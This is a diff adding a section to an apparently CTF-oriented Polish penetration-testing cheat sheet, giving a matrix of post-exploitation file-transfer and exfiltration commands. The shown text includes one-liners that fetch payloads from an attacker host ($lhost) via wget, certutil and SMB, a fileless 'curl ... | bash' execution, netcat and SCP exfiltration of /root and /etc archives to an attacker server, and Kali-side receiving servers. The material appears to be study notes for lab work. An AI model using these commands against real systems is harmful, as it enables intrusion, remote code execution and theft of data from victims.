@@ -2807,6 +2807,28 @@ tar czf dump.tar.gz /root /etc/                       # archiwizacja
 scp dump.tar.gz attacker@c2-server.thm:~              # exfil przez SCP
 ```
 
+## 9.6 Matryca transferu — „mam X → ta metoda"
+
+| Sytuacja | Metoda | Komenda (skrót) |
+|----------|--------|-----------------|
+| Linux, jest wyjście HTTP | wget/curl | `wget http://$lhost:8000/f -O /tmp/f` |
+| Windows PS, jest HTTP | IWR/WebClient | `iwr http://$lhost:8000/f -o f` |
+| **Windows, blind RCE** (brak interakcji) | certutil (LOLBin) | `certutil -urlcache -split -f http://$lhost:8000/f C:\Windows\Temp\f` |
+| **HTTP wychodzące zablokowane** | SMB share | `impacket-smbserver` + `copy \\$lhost\s\f` |
+| SMB też blokowane / mały plik | **base64 paste** | `base64 -w0 f` → wklej → `base64 -d` (§9.4) |
+| Tylko webshell (blind) | staging przez HTTP | serwuj z Apache, `tail -f access.log` = potwierdzenie pobrania |
+| Linux fileless (bez zapisu) | curl \| bash | `curl http://$lhost:8000/s.sh \| bash` |
+| Exfil z celu na Kali | nc / smbserver | listener: `nc -lvnp 443 > loot`; cel: `nc $lhost 443 < f` |
+
+**Serwery po stronie Kali (wybierz wg potrzeby):**
+```bash
+python3 -m http.server 8000                            # najszybszy HTTP (pull)
+sudo impacket-smbserver share $(pwd) -smb2support      # SMB — -smb2support KONIECZNE dla Win10/11!
+#   z uwierzytelnieniem (gdy Windows wymaga): dodaj -user u -password p, potem: net use \\$lhost\share /user:u p
+sudo python3 -m uploadserver 443                        # HTTP z UPLOADEM (exfil na Kali przez POST)
+```
+> ⚠️ **`-smb2support` to najczęstszy zapomniany flag** — bez niego `copy \\kali\share\...` na nowym Windows rzuca błąd „nie znaleziono ścieżki". Gdy Windows żąda uwierzytelnienia do share'a, użyj wersji `-user/-password`. Zapory: HTTP na porcie **80/443** przechodzi częściej niż `8000`.
+
 ---
 
 # 10. Persistence & Backdooring
